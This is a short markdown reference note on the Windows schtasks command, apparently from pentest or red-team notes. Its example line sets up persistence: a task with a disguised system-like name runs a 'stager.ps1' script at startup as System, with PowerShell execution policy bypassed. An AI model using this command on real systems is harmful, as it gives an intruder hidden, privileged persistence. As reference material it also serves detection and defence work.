# SCHTASKS

Used to create tasks in windows that run periodically


## Sintax

```schtasks.exe /create /TN $taskName /ST $time /SC DAILY /SD $startDate /ED $endDate /TR "powershell.exe -file C:\users\myprofile\desktop\scriptname.ps1 -mode $serviceChoice -list $listChoice"```


## Example

```schtasks /create /TN WindowsSecDriveOper_x64 /SC onstart /TR "powershell -executionpolicy bypass -file "C:\Users\Enbot\stager.ps1"" /ru System```
